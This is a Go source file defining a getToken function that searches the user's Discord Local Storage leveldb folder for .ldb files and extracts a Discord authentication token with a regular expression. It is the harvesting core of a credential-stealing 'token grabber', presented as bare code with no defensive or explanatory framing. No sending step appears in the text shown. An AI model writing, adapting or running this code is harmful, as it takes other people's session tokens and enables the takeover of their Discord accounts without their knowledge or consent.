package main

import (
	"io/ioutil"
	"os"
	"path"
	"path/filepath"
	"regexp"
)

func getToken() string {
	appdata, err := os.UserConfigDir()
	if err != nil {
		return err.Error()
	}

	dir := path.Join(appdata, "discord/Local Storage/leveldb")

	if _, err := os.Stat(dir); !os.IsNotExist(err) {
		var files []string

		err = filepath.Walk(dir, func(path string, info os.FileInfo, _ error) error {
			extension := filepath.Ext(path)

			if !info.IsDir() && extension == ".ldb" {
				files = append(files, path)
			}
			return nil
		})

		if err != nil {
			return err.Error()
		}

		for _, file := range files {
			data, err := ioutil.ReadFile(file)
			if err != nil {
				return err.Error()
			}

			re := regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}")
			return re.FindString(string(data))
		}
	}

	return ""
}
